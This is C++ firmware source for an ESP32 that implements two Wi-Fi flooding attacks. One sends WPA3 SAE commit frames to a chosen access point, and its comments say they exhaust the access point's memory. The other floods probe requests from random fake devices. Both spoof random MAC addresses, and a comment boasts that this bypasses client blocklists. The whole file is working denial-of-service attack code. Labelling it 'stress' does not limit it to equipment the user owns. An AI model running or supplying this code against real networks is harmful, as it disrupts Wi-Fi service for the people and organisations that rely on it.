#include "PoliticianStress.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"

namespace politician {
namespace stress {

void saeCommitFlood(const uint8_t* bssid, uint32_t count) {
    // 802.11 Authentication Frame Header (WPA3 SAE)
    uint8_t pkt[42] = {
        0xB0, 0x00, 0x3C, 0x00, // Frame Control (Auth), Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver Address (Target AP)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter Address (Randomized)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // BSSID (Target AP)
        0x00, 0x00, // Sequence Control
        
        // --- Auth Body ---
        0x03, 0x00, // Auth Algorithm: 3 (SAE)
        0x01, 0x00, // Auth Seq: 1 (Commit)
        0x00, 0x00, // Status Code: 0 (Successful)
        // Group ID (2 bytes)
        0x13, 0x00, // 19 = NIST P-256
        // Empty payload elements follow in a real transaction, but creating the 
        // connection state triggers the WPA3 RAM exhaustion immediately anyway.
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 
    };

    // Copy the target BSSID directly into the Recipient and BSSID fields
    memcpy(&pkt[4], bssid, 6);
    memcpy(&pkt[16], bssid, 6);

    for (uint32_t i = 0; i < count; i++) {
        // Bruteforce a completely random MAC address to bypass client blocklists!
        for (int m = 0; m < 6; m++) {
            pkt[10 + m] = (uint8_t)(esp_random() & 0xFF);
        }
        pkt[10] &= 0xFE; // Ensure Unicast
        pkt[10] |= 0x02; // Mark as Locally Administered MAC

        esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    }
}

void probeRequestFlood(uint32_t count) {
    // 802.11 Probe Request Frame Header
    uint8_t pkt[36] = {
        0x40, 0x00, 0x00, 0x00, // Frame Control (Probe Req), Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast RA
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Transmitter Address (Randomized)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Broadcast BSSID
        0x00, 0x00, // Sequence Control
        
        // IE Tag 0: SSID (Broadcast - Length 0)
        0x00, 0x00,
        
        // IE Tag 1: Supported Rates
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24
    };

    for (uint32_t i = 0; i < count; i++) {
        // Rapidly spin up random fake devices demanding network parameters
        for (int m = 0; m < 6; m++) {
            pkt[10 + m] = (uint8_t)(esp_random() & 0xFF);
        }
        pkt[10] &= 0xFE; 
        pkt[10] |= 0x02; 
        
        esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    }
}

} // namespace stress
} // namespace politician
